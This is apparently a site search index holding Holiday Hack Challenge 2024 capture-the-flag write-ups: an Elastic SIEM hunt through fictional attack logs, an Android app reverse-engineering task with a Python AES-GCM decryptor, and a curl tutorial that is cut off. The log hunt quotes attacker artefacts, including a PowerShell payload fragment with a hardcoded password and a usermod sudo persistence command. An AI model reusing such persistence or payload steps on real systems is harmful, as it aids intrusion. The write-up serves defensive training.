var relearn_searchindex = [
  {
    "breadcrumb": "HHC 2024 \u003e Act3",
    "content": "Objective Help the ElfSOC analysts track down a malicious attack against the North Pole domain.\nYou are offered to either download the logs and do the excersices on your own, or download the ELK stack (logs included):\nhttps://hhc24-elfstack.holidayhackchallenge.com/download_file/log_chunk_2.log.zip https://hhc24-elfstack.holidayhackchallenge.com/download_file/elf-stack-siem-with-logs.zip https://hhc24-elfstack.holidayhackchallenge.com/download_file/log_chunk_1.log.zip I chose to mainly solve this objective using Elastic, since this is what I am used to. However, as we shall see later on, some CLI magic had to happen.\nHints From Hint Fitzy Shortstack Fitzy Shortstack Fitzy Shortstack Some elves have tried to make tweaks to the Elf Stack log parsing logic, but only a seasoned SIEM engineer or analyst may find that task useful. Fitzy Shortstack I was on my way to grab a cup of hot chocolate the other day when I overheard the reindeer talking about playing games. The reindeer mentioned trying to invite Wombley and Alabaster to their games. This may or may not be great news. All I know is, the reindeer better create formal invitations to send to both Wombley and Alabaster. Fitzy Shortstack I’m part of the ElfSOC that protects the interests here at the North Pole. We built the Elf Stack SIEM, but not everybody uses it. Some of our senior analysts choose to use their command line skills, while others choose to deploy their own solution. Any way is possible to hunt through our logs! Fitzy Shortstack One of our seasoned ElfSOC analysts told me about a great resource to have handy when hunting through event log data. I have it around here somewhere, or maybe it was online. Hmm. Fitzy Shortstack Our Elf Stack SIEM has some minor issues when parsing log data that we still need to figure out. Our ElfSOC SIEM engineers drank many cups of hot chocolate figuring out the right parsing logic. The engineers wanted to ensure that our junior analysts had a solid platform to hunt through log data. Solution Silver Question 1 How many unique values are there for the event_source field in all logs?\nAnswer: 5\nComment:\nElastic’s visualization library in Kibana makes it simple to create insightful, dynamic table views from Elasticsearch data. Tables provide a structured way to display detailed information, making them ideal for logs, metrics, and categorical data analysis. With easy configuration and filtering options, users can highlight key metrics and trends directly within their datasets. Interactive dashboards enhance these table views, allowing seamless cross-filtering and drill-downs. This approach ensures a clear and actionable understanding of your data.\nQuestion 2 Which event_source has the fewest number of events related to it?\nAnswer: AuthLog\nComment:\nElastic’s visualization library to the rescue for this one as well\nQuestion 3 Using the event_source from the previous question as a filter, what is the field name that contains the name of the system the log event originated from?\nAnswer: event.hostname\nMost fields can be found either by poking around in the record itself, as seen here. Or, by looking into the “Available fields” section on the left side (given that you have a representational selection of records from your query)\nQuestion 4 Which event_source has the second highest number of events related to it?\nAnswer: NetflowPmacct\nComment:\nElastic’s visualization library to the rescue for this one as well\nQuestion 5 Using the event_source from the previous question as a filter, what is the name of the field that defines the destination port of the Netflow logs?\nAnswer: event.port_dst\nComment:\nMost fields can be found either by poking around in the record itself, as seen here. Or, by looking into the “Available fields” section on the left side (given that you have a representational selection of records from your query)\nQuestion 6 Which event_source is related to email traffic?\nAnswer: SnowGlowMailPxy\nComment:\nElastic’s visualization library .. We are getting pretty used to this view by now\nQuestion 7 Looking at the event source from the last question, what is the name of the field that contains the actual email text?\nAnswer: event.Body\nComment:\nElastic’s visualization library .. Yup - we are pretty used to this view by now\nQuestion 8 Using the ‘GreenCoat’ event_source, what is the only value in the hostname field?\nAnswer: SecureElfGwy\nComment:\nHere I built myself a view consisting of “@timestamp”, “event.source” and “hostname”. This is a great way to build custom views when your are hunting for something\nQuestion 9 Using the ‘GreenCoat’ event_source, what is the name of the field that contains the site visited by a client in the network?\nAnswer: event.url\nComment:\nNothing much to elaborate on here\nQuestion 10 Using the ‘GreenCoat’ event_source, which unique URL and port (URL:port) did clients in the TinselStream network visit most?\nAnswer: pagead2.googlesyndication.com:443\nComment:\nElastic’s visualization library table view can handle multiple columns - which make it a great tool for tasks like this.\nQuestion 11 Using the ‘WindowsEvent’ event_source, how many unique Channels is the SIEM receiving Windows event logs from?\nAnswer: 5\nComment:\nElastic’s visualization library has many options you can fiddle with on the right side according to taste, preference and assignment.\nQuestion 12 What is the name of the event.Channel (or Channel) with the second highest number of events?\nAnswer: Microsoft-Windows-Sysmon/Operational\nComment:\nElastic’s visualization library .. you can also interpet data yourself in this tool …\nQuestion 13 Our environment is using Sysmon to track many different events on Windows systems. What is the Sysmon Event ID related to loading of a driver?\nAnswer: 6\nComment:\nYou know the objective is getting serious when you got questions related to Sysmon. For reference I have chosen to include a reference to Sysmon Event Ids here. Another good resource for the ids is: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon\nEvent ID Name Description 1 ProcessCreate Logs when a process is created, including command line arguments and parent process information. 2 FileCreateTime Logs changes to file creation time (can be used to detect timestomping). 3 NetworkConnect Logs outbound network connections initiated by a process. 4 SysmonConfigChange Logs when the Sysmon configuration is changed. 5 ProcessTerminate Logs when a process is terminated. 6 DriverLoad Logs when a driver is loaded, including details about its signing status. 7 ImageLoad Logs when an image (DLL or executable) is loaded into a process. 8 CreateRemoteThread Logs when a thread is created in another process (often used for code injection). 9 RawAccessRead Logs when raw disk access is performed, typically for malicious activity like MBR access. 10 ProcessAccess Logs when a process accesses another process (e.g., via OpenProcess API). 11 FileCreate Logs when a file is created or overwritten. 12 RegistryEvent (SetValue) Logs when a registry value is set or modified. 13 RegistryEvent (Key/Value Create/Delete) Logs when a registry key or value is created or deleted. 14 RegistryEvent (Key/Value Rename) Logs when a registry key or value is renamed. 15 FileCreateStreamHash Logs creation of alternate data streams (ADS) and provides a hash of the stream contents. 16 ServiceConfigurationChange Logs changes to service configurations. 17 PipeEvent (Pipe Created) Logs when a named pipe is created. 18 PipeEvent (Pipe Connected) Logs when a named pipe is connected. 19 WmiEvent (Filter) Logs WMI filter activity, useful for detecting WMI-based attacks. 20 WmiEvent (Consumer) Logs WMI consumer activity. 21 WmiEvent (FilterToConsumer Binding) Logs the binding of a WMI filter to a consumer. 22 DNSEvent Logs DNS query activity. 23 FileDelete Logs file deletions (if enabled). 24 ClipboardChange Logs clipboard activity (disabled by default; must be enabled in configuration). 25 ProcessTampering Logs process image tampering, such as code injection or manipulation. 26 FileDeleteDetected Logs when file deletion is detected, providing additional context (used with FileDelete). Question 14 What is the Windows event ID that is recorded when a new service is installed on a system?\nAnswer: 4697\nComment:\nA great resource for looking up Windows Event IDs is: https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/\nQuestion 15 Using the WindowsEvent event_source as your initial filter, how many user accounts were created?\nAnswer: 0\nComment:\nLooked for Windows event code 4720, but couldn’t find any. So I figured out there were none user created\nGold Question 1 What is the event.EventID number for Sysmon event logs relating to process creation?\nAnswer: 1\nComment:\nThis is just one of the IDs you must know by the heart.\nQuestion 2 How many unique values are there for the ’event_source’ field in all of the logs?\nAnswer: 5\nComment:\nThe same answer for some ealier questions.\nQuestion 3 What is the event_source name that contains the email logs?\nAnswer: SnowGlowMailPxy\nComment:\nThe same answer for some ealier questions.\nQuestion 4 The North Pole network was compromised recently through a sophisticated phishing attack sent to one of our elves. The attacker found a way to bypass the middleware that prevented phishing emails from getting to North Pole elves. As a result, one of the Received IPs will likely be different from what most email logs contain. Find the email log in question and submit the value in the event ‘From:’ field for this email log event.\nAnswer: kriskring1e@northpole.local\nComment:\nElastic’s visualization library to the rescue for this one as well\nQuestion 5 Our ElfSOC analysts need your help identifying the hostname of the domain computer that established a connection to the attacker after receiving the phishing email from the previous question. You can take a look at our GreenCoat proxy logs as an event source. Since it is a domain computer, we only need the hostname, not the fully qualified domain name (FQDN) of the system.\nAnswer: SleighRider\nComment:\nStep 1: Finding information by using Lens. My hypothesis here is to find the IP, hostname and user that occurs the least:\nStep 2: Having a set of interesting IP, hostname and user, I could start narrowing down the resultset in Kibana. In this screenshot I have narrowed myself in on user “elf_user02” due to findings in step 1:\nQuestion 6 What was the IP address of the system you found in the previous question?\nAnswer: 172.24.25.12\nComment:\nAdded field “even.ip” to the result table view for the search from question 5 above.\nQuestion 7 A process was launched when the user executed the program AFTER they downloaded it. What was that Process ID number (digits only please)?\nAnswer: 10014\nComment:\nAccording to the question we are looking for a process that was launched. Given the context the last few questions (regarding user “elf_user02”), I made a hypothesis that this username would be present in the commandline - both in the “event.CommandLine” and the “event.ParentCommandLine”. Based on this, I made the following query:\n(event.CommandLine:*user* AND event.CommandLine:*elf_user02*) OR (event.ParentCommandLine:*user* AND event.ParentCommandLine:*elf_user02*) I also filtered on “event.EventID: 1” according to the Sysmon table I included earlier.\nQuestion 8 Did the attacker’s payload make an outbound network connection? Our ElfSOC analysts need your help identifying the destination TCP port of this connection.\nAnswer: 8443\nComment:\nFor this question I thought it was important to extract IOC’s from the previous query:\nIOC Value Process ID 10014 Download path C:\\Users\\elf_user02\\Downloads\\howtosavexmas\\howtosavexmas.pdf.exe Parent Process ID 5680 Parent Process Explorer.exe Download Time Sep 15, 2024 @ 16:37:50.00 Execution Time Sep 15, 2024 @ 16:38:34.000 Event Hostname SleighRider.northpole.local Based on the IOC list above, I identified the “Download Time” and the filename from the “Download Path” as important indicators. The string “howtosavexmas” makes an excellent wildcard search term because of its uniqueness. Combined with Sysmon Event ID 3 (Network Connection), these elements provided valuable input for my query. I focused on finding timestamps in the search results that closely matched the download’s time window, enabling a more targeted investigation.\nQuestion 9 The attacker escalated their privileges to the SYSTEM account by creating an inter-process communication (IPC) channel. Submit the alpha-numeric name for the IPC channel used by the attacker.\nAnswer: ddpvccdbr\nComment:\nIPC means Pipes. I just made a wildcard search for pipe paired with Sysmon ID 1.\nQuestion 10 The attacker’s process attempted to access a file. Submit the full and complete file path accessed by the attacker’s process.\nAnswer: C:\\Users\\elf_user02\\Desktop\\kkringl315@10.12.25.24.pem\nComment:\nIn this query I have filtered on certain event ids. Here’s a table summarizing the filtered event IDs and their descriptions:\nEvent ID Source Description Details 4663 Windows Security Audit Object Access: Logged when a file or folder is accessed, modified, or deleted. Requires “Audit Object Access” policy and specific auditing settings on the object. 4656 Windows Security Handle Request: Logged when an attempt is made to access an object (file or directory). Shows requested access before it is granted or denied. 11 Sysmon File Created: Logged when a new file is created. Includes the file path, providing insight into potential malicious file creation activity. 15 Sysmon File Deleted: Logged when a file is deleted. Tracks file deletion, useful for identifying attempts to cover tracks or remove evidence. 23 Sysmon FileStream Created: Logged when an alternate data stream (ADS) is created within a file. Indicates potential hiding of data within ADS, a technique often used by attackers. _I have also filtered on some process ID’s present in either “event.processId” and “event.ProcessID”. Why there are two fields having nearly identical names is unknown to me. Anyways, these process ids where found along the way during the investigation (this is how I roll as a threat hunter).\nQuestion 11 The attacker attempted to use a secure protocol to connect to a remote system. What is the hostname of the target server?\nAnswer: kringleSSleigH\nComment:\nFollowed the trail using the IP from the last question (it wasn’t visible in my screenshot).\nQuestion 12 The attacker created an account to establish their persistence on the Linux host. What is the name of the new account created by the attacker?\nAnswer: ssdh\nComment:\nOn this one I was lazy. I thought he attacker used the CLI on the Linux host. So - adduser was the most likely from my mind.\nQuestion 13 The attacker wanted to maintain persistence on the Linux host they gained access to and executed multiple binaries to achieve their goal. What was the full CLI syntax of the binary the attacker executed after they created the new user account?\nAnswer: /usr/sbin/usermod -a -G sudo ssdh\nComment:\nFrom the previous question and answer I saw that the term “TTY” figured a lot.\nQuestion 14 The attacker enumerated Active Directory using a well known tool to map our Active Directory domain over LDAP. Submit the full ISO8601 compliant timestamp when the first request of the data collection attack sequence was initially recorded against the domain controller.\nAnswer: 2024-09-16T11:10:12-04:00\nComment:\nI had issues finding the right timestamp. I retorted to creating a Lucene regex seach matching the format I needed, hopefully wishing it would match a timestmap. And it did:\n/.*\\d{4}\\-\\d{2}\\-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\-\\d{2}:\\d{2}.*/ AND *dc01* Also narrowed down the query to handle just “event.ServicePort: 389” (lDAP)\nQuestion 15 The attacker attempted to perform an ADCS ESC1 attack, but certificate services denied their certificate request. Submit the name of the software responsible for preventing this initial attack.\nAnswer: KringleGuard\nComment:\nFor this query I found the following Windows Event IDs important:\nEvent ID Source Description Details 4888 Windows Security Object Added to Central Access Policy: Logged when an object (e.g., a file) is added to a Central Access Policy. Indicates a change in resource access management under Dynamic Access Control (DAC). 4889 Windows Security Central Access Policy Removed from Object: Logged when a Central Access Policy is removed from an object. Tracks changes to DAC-based access control policies on resources. 4890 Windows Security Central Access Policy on Object Access Attempt: Logged when access to an object under a Central Access Policy is attempted. Useful for monitoring and troubleshooting access issues related to DAC policies. Question 16 We think the attacker successfully performed an ADCS ESC1 attack. Can you find the name of the user they successfully requested a certificate on behalf of?\nAnswer: nutcrakr\nComment:\nUsing the same query as the last one\nQuestion 17 One of our file shares was accessed by the attacker using the elevated user account (from the ADCS attack). Submit the folder name of the share they accessed.\nAnswer: WishLists\nComment:\nThis event ID was important for this query:\nEvent ID Source Description Details 5145 Windows Security A network share object was accessed. Logged when a file or folder is accessed over a shared network resource (SMB). Question 18 The naughty attacker continued to use their privileged account to execute a PowerShell script to gain domain administrative privileges. What is the password for the account the attacker used in their attack payload?\nAnswer: fR0s3nF1@k3_s\nComment:\nI fiddled quite a bit with finding something sensible in Elastic. After much struggle I downloaded the logs to my Kali machine and started grepping instead. With that approach it took me some 10 seconds on a slow computer to find the password:\ngrep -i nutcrakr *.log Output, password found in PowerShell variable $pswd:\nlog_chunk_2.log:\u003c134\u003e1 2024-09-16T11:33:12-04:00 SleighRider.northpole.local WindowsEvent - - - {\"MessageNumber\": 1, \"MessageTotal\": 1, \"ScriptBlockText\": \"Add-Type -AssemblyName System.DirectoryServices\\n$ldapConnString = \\\"LDAP://CN=Domain Admins,CN=Users,DC=northpole,DC=local\\\"\\n$username = \\\"nutcrakr\\\"\\n$pswd = 'fR0s3nF1@k3_s'\\n$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'\\n$propGUID = [guid]'00000000-0000-0000-0000-000000000000' Question 19 The attacker then used remote desktop to remotely access one of our domain computers. What is the full ISO8601 compliant UTC EventTime when they established this connection?\nAnswer: 2024-09-16T15:35:57.000Z\nComment:\nLogon ID 10 in Windows refers to a Remote Interactive Logon. It is typically associated with Remote Desktop Protocol (RDP) sessions, where a user connects to a machine remotely using tools like Remote Desktop.\nQuestion 20 The attacker is trying to create their own naughty and nice list! What is the full file path they created using their remote desktop connection?\nAnswer: C:\\WishLists\\santadms_only\\its_my_fakelst.txt\nComment:\nHere I narrowed down/filtered my query using artefacts I had found along the way. When I had a low number of records (37), I simply scrolled through the customized view table and found a reference to Notepad\nQuestion 21 The Wombley faction has user accounts in our environment. How many unique Wombley faction users sent an email message within the domain?\nAnswer: 4\nComment: I simply took a look at all the receiving e-mail addresses and found a pattern - “wco”. I figured out that the “w” was for “Wombley”. I set up my query like in the screenshot, and then went into the “Field Statistics” to get more information\nQuestion 22 The Alabaster faction also has some user accounts in our environment. How many emails were sent by the Alabaster users to the Wombley faction users?\nAnswer: 22\nComment:\nI took basis in the previous query results and added “asnowball” into the mix after finding this reference in the query results.\nQuestion 23 Of all the reindeer, there are only nine. What’s the full domain for the one whose nose does glow and shine? To help you narrow your search, search the events in the ‘SnowGlowMailPxy’ event source.\nAnswer: rud01ph.glow\nComment:\nFor this I took basis in the question text and extracted some sensible keywords to search for. All MacGyver style:\nQuestion 24 Question 24: With a fiery tail seen once in great years, what’s the domain for the reindeer who flies without fears? To help you narrow your search, search the events in the ‘SnowGlowMailPxy’ event source.\nAnswer: c0m3t.halleys\nComment:\nThe qustion starts of with an important clue, “With a fiery tail seen once in great years”. This could only mean Halleys comet, which will be the basis for my query:\nAnd done!",
    "description": "Objective Help the ElfSOC analysts track down a malicious attack against the North Pole domain.\nYou are offered to either download the logs and do the excersices on your own, or download the ELK stack (logs included):\nhttps://hhc24-elfstack.holidayhackchallenge.com/download_file/log_chunk_2.log.zip https://hhc24-elfstack.holidayhackchallenge.com/download_file/elf-stack-siem-with-logs.zip https://hhc24-elfstack.holidayhackchallenge.com/download_file/log_chunk_1.log.zip I chose to mainly solve this objective using Elastic, since this is what I am used to. However, as we shall see later on, some CLI magic had to happen.",
    "tags": [],
    "title": "Elf Stack",
    "uri": "/act3/elf-stack/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act2",
    "content": "Objective Help find who has been left out of the naughty AND nice list this Christmas. Please speak with Eve Snowshoes for more information.\nHints Mobile Analysis Easy - Tools\nFrom Objective Description Eve Snowshoes Mobile Analysis Try using apktool or jadx Mobile Analysis Easy - Missing\nFrom Objective Description Eve Snowshoes Mobile Analysis Maybe look for what names are included and work back from that? Mobile Analysis Hard - Format\nFrom Objective Description Eve Snowshoes Mobile Analysis So yeah, have you heard about this new Android app format? Want to convert it to an APK file? Mobile Analysis Hard - Encryption and Obfuscation\nFrom Objective Description Eve Snowshoes Mobile Analysis Obfuscated and encrypted? Hmph. Shame you can’t just run strings on the file. Eve Snowshoes conversation\nHi there, tech saviour! Eve Snowshoes and Team Alabaster in need of assistance. I’ve been busy creating and testing a modern solution to Santa’s Naughty-Nice List, and I even built an Android app to streamline things for Alabaster’s team. But here’s my tiny reindeer-sized problem: I made a debug version and a release version of the app. I accidentally left out a child’s name on each version, but for the life of me, I can’t remember who! Could you start with the debug version first, figure out which child’s name isn’t shown in the list within the app, then we can move on to release? I’d be eternally grateful!\nFor clarity, I have included the links from Eve Snowshoes in cleartext here:\nhttps://www.holidayhackchallenge.com/2024/SantaSwipe.apk https://www.holidayhackchallenge.com/2024/SantaSwipeSecure.aab Solution Silver Getting the necessary files First I downloaded the aab and apk in Kali Linux:\nwget https://www.holidayhackchallenge.com/2024/SantaSwipeSecure.aab wget https://www.holidayhackchallenge.com/2024/SantaSwipe.apk Investigating APK Decompiling APK:\napktool d SantaSwipe.apk The objective hints at there’s a “naughty AND nice” list. Let’s see where this list could be by just grepping for the word “naughty”:\ncd SantaSwipe grep -Rni \"naughty\" * In the, not so quite massive, output I found a reference to a database:\nsmali_classes3/com/northpole/santaswipe/DatabaseHelper.smali:82: const-string v2, \"naughtynicelist.db\" Since this is an APK and I highly doubt the database comes with it, I reckoned that there were some insert statements in the DatabaseHelper.smali file. I found these statements:\ngrep -i insert DatabaseHelper.smali const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Carlos, Madrid, Spain\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Aiko, Tokyo, Japan\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Maria, Rio de Janeiro, Brazil\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Liam, Dublin, Ireland\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Emma, New York, USA\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Chen, Beijing, China\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Fatima, Casablanca, Morocco\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Hans, Berlin, Germany\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Olga, Moscow, Russia\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Ravi, Mumbai, India\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Amelia, Sydney, Australia\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Juan, Buenos Aires, Argentina\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Sofia, Rome, Italy\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Ahmed, Cairo, Egypt\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Yuna, Seoul, South Korea\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Ellie, Alabama, USA\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Lucas, Paris, France\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Mia, Toronto, Canada\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Sara, Stockholm, Sweden\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Ali, Tehran, Iran\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Nina, Lima, Peru\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Anna, Vienna, Austria\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Leo, Helsinki, Finland\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Elena, Athens, Greece\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Davi, Sao Paulo, Brazil\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Marta, Warsaw, Poland\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Noah, Zurich, Switzerland\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Ibrahim, Ankara, Turkey\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Emily, Wellington, New Zealand\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Omar, Oslo, Norway\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Fatou, Dakar, Senegal\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Olivia, Vancouver, Canada\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Ethan, Cape Town, South Africa\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Santiago, Bogota, Colombia\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Isabella, Barcelona, Spain\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Ming, Shanghai, China\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Chloe, Singapore, Singapore\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Mohammed, Dubai, UAE\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Ava, Melbourne, Australia\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Luca, Milan, Italy\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Sakura, Kyoto, Japan\\');\" const-string v0, \"INSERT INTO NormalList (Item) VALUES (\\'Edward, New Jersey, USA\\');\" Cleaned the output by some SED magic and stored it a CSV file:\ngrep -i insert DatabaseHelper.smali | sed -E \"s/.*'([^']+), ([^,]+), ([^']+)'.*/\\1, \\2, \\3/\" | sed 's/\\\\$//' | sort \u003e apk-list.txt Resulting in this list:\nAhmed, Cairo, Egypt Aiko, Tokyo, Japan Ali, Tehran, Iran Amelia, Sydney, Australia Anna, Vienna, Austria Ava, Melbourne, Australia Carlos, Madrid, Spain Chen, Beijing, China Chloe, Singapore, Singapore Davi, Sao Paulo, Brazil Edward, New Jersey, USA Elena, Athens, Greece Ellie, Alabama, USA Emily, Wellington, New Zealand Emma, New York, USA Ethan, Cape Town, South Africa Fatima, Casablanca, Morocco Fatou, Dakar, Senegal Hans, Berlin, Germany Ibrahim, Ankara, Turkey Isabella, Barcelona, Spain Juan, Buenos Aires, Argentina Leo, Helsinki, Finland Liam, Dublin, Ireland Luca, Milan, Italy Lucas, Paris, France Maria, Rio de Janeiro, Brazil Marta, Warsaw, Poland Mia, Toronto, Canada Ming, Shanghai, China Mohammed, Dubai, UAE Nina, Lima, Peru Noah, Zurich, Switzerland Olga, Moscow, Russia Olivia, Vancouver, Canada Omar, Oslo, Norway Ravi, Mumbai, India Sakura, Kyoto, Japan Santiago, Bogota, Colombia Sara, Stockholm, Sweden Sofia, Rome, Italy Yuna, Seoul, South Korea Investigating AAB Download the Bundletool from hint:\nwget https://github.com/google/bundletool/releases/download/1.17.2/bundletool-all-1.17.2.jar Generating a keystore\nkeytool -genkey -v -keystore upload-keystore.jks -keyalg RSA -keysize 2048 -validity 10000 -alias upload Running Bundletool\njava -jar bundletool-all-1.17.2.jar build-apks --bundle=SantaSwipeSecure.aab --output=output.apks --mode=universal --ks=upload-keystore.jks --ks-key-alias=upload --ks-pass=pass:jallafisk Collecting APK\nmv output.apks output.zip unzip output.zip -d output cd output From this folder I uploaded the extracted APK and loaded it into https://appetize.io/ and ran the APK there. By comparing the list in this APP (screenshot below) I found that the missing kid was Ellie\nIn retrospect, instead of following this overly long methodology, I could’ve just looked into the following file by just grepping for “NormalList”:\nMainActivity$WebAppInterface.smali:1090: const-string v3, \"SELECT Item FROM NormalList WHERE Item NOT LIKE \\'%Ellie%\\ Gold With the file output.apks from silver solution, I decompile it using apktool:\ncd universal apktool d universal.apk cd universal Now standing inside the decompiled APK, I retry to find a point I can work on:\ngrep -Rni naughty * ... smali/com/northpole/santaswipe/DatabaseHelper.smali ... Inside this file I found several interesting lines, first something that loads “ek” and “iv” from R class as string:\n.line 25 sget v0, Lcom/northpole/santaswipe/R$string;-\u003eek:I ... .line 26 sget v2, Lcom/northpole/santaswipe/R$string;-\u003eiv:I ... .line 335 :try_start_0 const-string v0, \"AES/GCM/NoPadding\" It appears that we got a decrypt function utilzing “AES/GCM/NoPadding”, using “ek” and “iv”. In file res/values/strings.xml I found the following interesting values, which seems to correspond well to the above:\n\u003cstring name=\"ek\"\u003ermDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw=\u003c/string\u003e ... \u003cstring name=\"iv\"\u003eQ2hlY2tNYXRlcml4\u003c/string\u003e And a bunch of Base64 looking strings (which I extracted into a file):\nstrings smali/com/northpole/santaswipe/DatabaseHelper.smali | grep \"const-string v\" | sed 's/^[^,]*, //; s/\"//g' \u003e ~/HHC/b64.txt The list looking like this:\nI2DF3+Y1t50nWMN2K9MV6Qx+1mbIOp5nPzrOusVi9a3n/50= O2nb1+t38vJmctBqZpE87xttw59XDIVWsL+jOGYAZSakGQcwH9LkY0MNP74= Lm3H1K45zb8hQ9R7K9MT/Bpv1toWCeg3YKGO+eApkQGBF09JMw== JG3E0/o1t5MzX9h6b99wyRB8z9IZOEuf/8PQJ7tJYwF2ZBYDZDY= MWfO0+M1t58yWdR3dN9wyQdrx9AS/R916miej6pBB+UB54ZZ1g== ... Okay. I have much information. On this point I asked ChatGPT to give me a decryptor for “AES/GCM/NoPadding” in Python, giving it also the EK and IV. With the code it gave me, I made some changes to make it read the hashes from my text file of hases (b64.txt). The code ended up like this:\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad import base64 def decrypt_aes_gcm(encrypted_data_b64, key_b64, iv_b64): try: # Decode the Base64-encoded key, IV, and encrypted data key = base64.b64decode(key_b64) iv = base64.b64decode(iv_b64) encrypted_data = base64.b64decode(encrypted_data_b64) # Initialize the AES-GCM cipher for decryption cipher = AES.new(key, AES.MODE_GCM, nonce=iv) # Decrypt and verify the data (GCM mode doesn't use explicit padding) decrypted_data = cipher.decrypt_and_verify(encrypted_data[:-16], encrypted_data[-16:]) # Return the decrypted string return decrypted_data.decode('utf-8') except Exception as e: print(f\"Decryption failed: {e}\") return None key_b64 = \"rmDJ1wJ7ZtKy3lkLs6X9bZ2Jvpt6jL6YWiDsXtgjkXw=\" iv_b64 = \"Q2hlY2tNYXRlcml4\" with open(\"b64.txt\", \"r\") as infile: for line in infile.readlines(): # Decrypt and print the result decrypted_result = decrypt_aes_gcm(line, key_b64, iv_b64) print(\"Decrypted:\", decrypted_result) The first run it presented me with this output:\n... Decrypted: Leila, Algiers, Algeria Decrypted: Omar, Doha, Qatar Decrypted: Marie, Luxembourg, Luxembourg Decrypted: Tom, Los Angeles, USA Decrypted: Edwards, New Jersey, USA Decryption failed: Incorrect padding Decrypted: None Decryption failed: MAC check failed Decrypted: None Decryption failed: Incorrect padding Decrypted: None Decryption failed: Incorrect padding Decrypted: None Decryption failed: Incorrect padding Decrypted: None Decryption failed: Invalid base64-encoded string: number of data characters (41) cannot be 1 more than a multiple of 4 Decrypted: None Decryption failed: MAC check failed Decrypted: None Decrypted: CREATE TRIGGER DeleteIfInsertedSpecificValue AFTER INSERT ON NormalList FOR EACH ROW BEGIN DELETE FROM NormalList WHERE Item = 'KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8='; END; Clearly the list isn’t exactly properly cleaned. Anyhow, it appears there’s an encrypted value in the DELETE statement at the very end. I simply copied that encrypted value into my “b64.txt” file and re-ran my Python script, which gave me the following output:\n... Decrypted: CREATE TRIGGER DeleteIfInsertedSpecificValue AFTER INSERT ON NormalList FOR EACH ROW BEGIN DELETE FROM NormalList WHERE Item = 'KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8='; END; Decrypted: Joshua, Birmingham, United Kingdom The answer for gold is Joshua",
    "description": "Objective Help find who has been left out of the naughty AND nice list this Christmas. Please speak with Eve Snowshoes for more information.\nHints Mobile Analysis Easy - Tools\nFrom Objective Description Eve Snowshoes Mobile Analysis Try using apktool or jadx Mobile Analysis Easy - Missing\nFrom Objective Description Eve Snowshoes Mobile Analysis Maybe look for what names are included and work back from that? Mobile Analysis Hard - Format",
    "tags": [],
    "title": "Mobile Analysis",
    "uri": "/act2/mobile-analysis/index.html"
  },
  {
    "breadcrumb": "HHC 2024 \u003e Act1",
    "content": "Objective Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!\nSolution Easy mode Assignment 1 Unlike the defined standards of a curling sheet, embedded devices often have web servers on non-standard ports. Use curl to retrieve the web page on host “curlingfun” port 8080. If you need help, run the ‘hint’ command. curl http:/curlingfun:8080 Assignment 2 Embedded devices often use self-signed certificates, where your browser will not trust the certificate presented. Use curl to retrieve the TLS-protected web page at https://curlingfun:9090/ curl --insecure https://curlingfun:9090 Assignment 3 Working with APIs and embedded devices often requires making HTTP POST requests. Use curl to send a request to https://curlingfun:9090/ with the parameter “skip” set to the value “alabaster”, declaring Alabaster as the team captain. curl --insecure https://curlingfun:9090 -X POST -d \"skip=alabaster\" Assignment 4 Working with APIs and embedded devices often requires maintaining session state by passing 